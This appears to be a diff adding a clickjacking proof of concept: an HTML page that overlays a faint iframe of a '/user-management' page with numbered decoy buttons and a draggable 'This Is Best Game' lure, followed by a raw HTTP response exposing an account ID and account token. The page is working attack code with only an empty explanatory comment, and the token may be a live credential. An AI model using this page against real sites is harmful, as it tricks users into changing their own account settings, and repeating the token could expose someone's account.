@@ -1,0 +1,39 @@
+<html>
+<head>
+<style>
+#payload{
+position: absolute;
+top: 20px;
+}
+iframe{
+width: 1000px;
+height: 675px;
+border: none;
+}
+.xss{
+position: fixed;
+background: #F00;
+}
+</style>
+</head>
+<body>
+<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
+<div style="height: 26px;width: 100px;right: 30%;top: 327px;background: #F8F;" class="xss">1. Click Here Change Notification</div>
+<div style="height: 30px;width: 50px;left: 20%;top: 100px;background: #F5F;" class="xss">3.Click me</div>
+<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="/user-management"></iframe>
+<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', '')"><h3>2.This Is Best Game</h3></div>
+<!-- 
+How Attacker Use This Attack 
+
+!-->
+</body>
+</html>
+
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 70
+Date: Thu, 01 Jul 2021 23:15:25 GMT
+Connection: close
+
+{"accountId":173569,"accountToken":"LdnJuCHtoaUaCqZeIKsseoRGOAGCsYIP"}
